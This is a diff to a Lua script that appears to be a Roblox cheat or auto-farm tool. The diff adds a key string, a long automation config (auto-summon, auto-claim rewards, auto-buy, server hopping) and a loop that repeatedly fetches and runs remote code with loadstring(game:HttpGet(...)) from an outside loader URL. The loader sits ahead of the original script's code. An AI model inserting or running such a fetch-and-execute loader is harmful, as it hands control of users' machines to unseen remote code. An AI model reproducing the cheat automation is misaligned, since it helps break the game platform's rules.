@@ -1,3 +1,7 @@
+getgenv().Key = "k3d5cc04abcc9f3116173d57"
+getgenv().Config = {["AutoVoteDifficulty"]=false,["RequiredGem"]=1000,["SellRarities"]={["Legendary"]=false,["Basic"]=false,["Epic"]=false,["Uncommon"]=false,["Rare"]=false},["DelayReplay"]=5,["WH_MatchComplete"]=false,["AutoSkip"]=false,["AutoClaimQuest"]=true,["TPLobbyIfPlayer"]=false,["WH_MailSent"]=false,["Summon10"]=true,["ALFS_DelayHop"]=30,["PlaceFailsafe"]=true,["AutoJoinEndless"]=false,["PlayMacro"]=false,["AutoMail"]=false,["AutoUseBoost"]=false,["AutoSummonTroop"]=false,["DelayJoin"]=5,["SellWave"]=1,["AutoClaimEventPass"]=true,["AutoReturnToLobby"]=false,["BuyEventName"]="arabiayi4042",["RequireRoll"]=0,["AutoJoinMatch"]=false,["ALFS_HopServer"]=false,["IgnoreMacroTiming"]=false,["AutoClaimDailyReward"]=true,["AutoSellOW"]=false,["BlackScreen"]=true,["BoostFPS"]=true,["DeleteMap"]=true,["AutoClaimVIP"]=true,["AutoReplay"]=false,["AutoListForSale"]=false,["AutoBuyEvent"]=true,["AutoClaimEventQuest"]=true,["AutoRejoin"]=false,["UseAll"]=false,["SummonDelay"]=0.3,["ABE_Gift"]=true,["AutoClaimPlaytimeReward"]=true,["JoinFailsafe"]=false,["UseBoosts"]={["2xCoinsBoost_1"]=false,["2xLuckBoost_1"]=false,["2xEventXPBoost_1"]=false,["2xEventXPBoost_10"]=false,["2xXPBoost_1"]=false,["2xXPBoost_10"]=false,["2xCoinsBoost_10"]=false,["2xLuckBoost_10"]=false},["AutoSave"]=true}
+repeat wait()spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(10)until Joebiden
+wait(15)
 if not getupvalue then getupvalue = debug.getupvalue end
 local users = {
 "Actellect75",
